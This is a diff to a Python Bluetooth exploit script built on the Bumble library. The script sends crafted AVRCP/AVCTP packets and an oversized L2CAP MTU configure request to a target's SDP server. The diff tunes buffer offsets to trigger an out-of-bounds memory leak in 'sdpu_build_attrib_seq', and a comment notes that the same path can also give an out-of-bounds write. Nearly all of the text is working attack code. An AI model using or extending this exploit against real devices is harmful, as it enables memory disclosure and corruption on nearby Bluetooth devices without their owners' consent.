@@ -55,7 +55,7 @@ def AvctMakePacket(transaction_label, packet_type, is_command, ipid, pid,
 
 
 async def main():
-    bumble.logging.setup_basic_logging("INFO")
+    bumble.logging.setup_basic_logging("DEBUG")
     async with await transport.open_transport(hci_transport) as (
             hci_source,
             hci_sink,
@@ -133,16 +133,28 @@ async def main():
                 error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
             ))
         await asyncio.sleep(0.5)
-        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
-            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
-                           0x4141, b"A" * 0x100))
-        device.sdp_server.channel.orig_on_configure_request(
-            configure_requests[0])
-        await asyncio.sleep(0.5)
         # with 0xef as my filler:
         # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
         # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
         buf_offset = 0x13
+        num_attr_filters_offset = 0x42
+        avrcp_command_buf = b"A" * (
+            num_attr_filters_offset - buf_offset) + struct.pack(
+                "<H", 0)
+        # technically you could set num_attr_filters_offset = big number to get a write out of bounds in sdpu_build_attrib_seq
+        # but we're just going to use this to leak
+        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
+            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
+                           0x4141, avrcp_command_buf))
+        configure_requests[0].options = l2cap.L2CAP_Configure_Request.encode_configuration_options(            [
+                (
+                    l2cap.L2CAP_MAXIMUM_TRANSMISSION_UNIT_CONFIGURATION_OPTION_TYPE,
+                    struct.pack('<H', 0x8000),
+                )
+            ])
+        device.sdp_server.channel.orig_on_configure_request(
+            configure_requests[0])
+        await asyncio.sleep(0.5)
         tSDP_DISCOVERY_DB_raw_data_offset = 0x70
         # raw_data, raw_size, raw_used
         #avrcp_command_buf = b"A" * (
